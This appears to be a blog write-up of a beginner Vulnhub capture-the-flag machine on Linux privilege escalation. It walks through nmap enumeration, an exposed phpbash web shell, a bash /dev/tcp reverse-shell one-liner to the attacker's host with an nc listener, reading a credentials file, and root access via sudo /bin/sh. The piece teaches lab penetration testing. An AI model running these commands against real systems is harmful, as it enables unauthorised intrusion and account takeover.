---
published: true
layout: post
category: writeup
title: Escalate My Privileges
author: F3dai
image: https://imgur.com/1H07JlN.png
---

This VM is made for playing with privileges. As its name, this box is specially made for learning and sharpening Linux Privilege Escalation skills. There are number of ways to playing with the privileges. Goal: First get the User of the Target then Start Playing with Privileges.

**URL:** [Escalate Privs Vulnhub](https://www.vulnhub.com/entry/escalate-my-privileges-1,448/)

**Difficulty:** Easy / Beginner Level

**Author:** Akanksha Sachin Verma

### Enumeration

Set up the Machine with a host-only adapter and run a net discover command to find the associated IP. My interface eth1 is Host Only on my main OS (Kali Linux).

<pre>netdiscover -i eth1</pre>

![netdiscover](https://imgur.com/ZXbe7TE.png)

The IP 192.168.56.113 has been found so we will do a port scan with the following IP:

<pre>nmap -p- -i "nmap" -sS 192.168.56.113</pre>

Nmap will scan every port with -p-, save to file -o and TCP SYN scan -sS.

![nmap](https://imgur.com/9oFhuw8.png)

Port 22, 80 and 111 is open. I will be focusing on port 80 for my enumeration however it's worth looking at port 111 to see if there are any mountable file systems. I won't go down this route but [this](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) website has a section on it. 

Opening up port 80 in a browser, we get this:

![p80](https://imgur.com/76wn0qP.png)

The nmap scan identified a robots.txt file which is worth checking out. Go to 192.168.56.113/robots.txt and there is an entry with the following:

<pre> - User-agent: *
Disallow: /phpbash.php</pre>

This means they do not want that page to be shown in google so we'll check it out anyway.

Going to 192.168.56.113/phpbash.php gives us the following page:

![phpbash](https://imgur.com/nQxbms3.png)

We already have a lower priv shell with the ID "apache". We are currently in the www/html directory where the web files are kept. 

### Upgrade Shell

Upgrading to a reverse shell will be easier to work with. I use [this website](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to decide how I will get a reverse shell. Simply use the bash 'one-liner' and listen to a chosen port. 

<pre>bash -i >& /dev/tcp/192.168.56.101/4545 0>&1 </pre>

![rev_shell](https://i.imgur.com/QYgCcDI.png)

In this case, the reverse shell will be aimed at my local IP 192.168.56.101 on port 4545. Therefore set up a netcat listener on this port.

Make sure the netcat is set up before the command is executed. 

<pre>nc -nvlp 4545</pre>

Then execute the reverse shell and a connection should be established with user "apache".

![netcat](https://i.imgur.com/AFYGLzO.png)

### Privilege Escalation

After some enumeration, some files are found in the home directory of "armour". The contents of Credentials.txt reveal a password with md5(). Md5 is an algorithm that is widely used for hash functions producing a 128-bit hash value.

The md5 value has been shown by echo.

<pre>cd /home/armour
ls -la
cat Credentials.txt
echo -n "rootroot1" | md5sum </pre>

![md5](https://imgur.com/BJ1q5M4.png)

Let's try and use this password for the user "armour" by changing the user with the following command:

<pre>su armour</pre>

![armour](https://imgur.com/iJDJnlr.png)

The password is correct, we now have a new shell with ID armour. Make sure to upgrade the shell.

<pre>id
python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>

First thing to do is to check the sudo privileges:

<pre>sudo -l</pre>

![sudo-l](https://imgur.com/qfvwZll.png)

There is a huge amount of options to explore however just by exploiting the first entry /bin/sh should give sudo privileges.

<pre>sudo /bin/sh</pre>

![root](https://imgur.com/aETTEPy.png)

And there is the flag in /root.
